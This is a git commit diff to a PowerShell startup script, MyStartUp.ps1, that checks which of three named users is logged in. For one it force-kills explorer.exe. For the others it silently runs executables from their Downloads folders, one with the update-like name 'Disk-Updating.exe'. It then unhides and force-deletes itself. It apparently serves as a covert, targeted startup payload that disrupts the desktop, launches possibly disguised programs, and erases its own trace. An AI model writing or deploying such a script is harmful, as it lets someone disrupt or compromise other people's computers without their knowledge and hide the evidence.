6b65a6ac3b1470fdbc2c9a7510c12a606ccd26f0
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-25 00:56:31 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -2,9 +2,17 @@ $user1 = "C:\Users\Jona"
 $user2 = "C:\Users\angel"
 $user3 = "C:\Users\seba"
 
-if ($env:USERPROFILE -eq $user1){taskkill /F /IM explorer.exe}
-if ($env:USERPROFILE -eq $user2){C:\Users\angel\Downloads\Disk-Updating.exe}
-if ($env:USERPROFILE -eq $user3){C:\Users\seba\Downloads\lml.exe}
+if ($env:USERPROFILE -eq $user1) {
+    taskkill /F /IM explorer.exe
+}
 
-attrib -h C:\Users\Public\MyStartUp.ps1
-del C:\Users\Public\MyStartUp.ps1
+if ($env:USERPROFILE -eq $user2) {
+    Start-Process -FilePath "C:\Users\angel\Downloads\Disk-Updating.exe" -NoNewWindow
+}
+
+if ($env:USERPROFILE -eq $user3) {
+    Start-Process -FilePath "C:\Users\seba\Downloads\lml.exe" -NoNewWindow
+}
+
+attrib -h "C:\Users\Public\MyStartUp.ps1"
+Remove-Item -Path "C:\Users\Public\MyStartUp.ps1" -Force
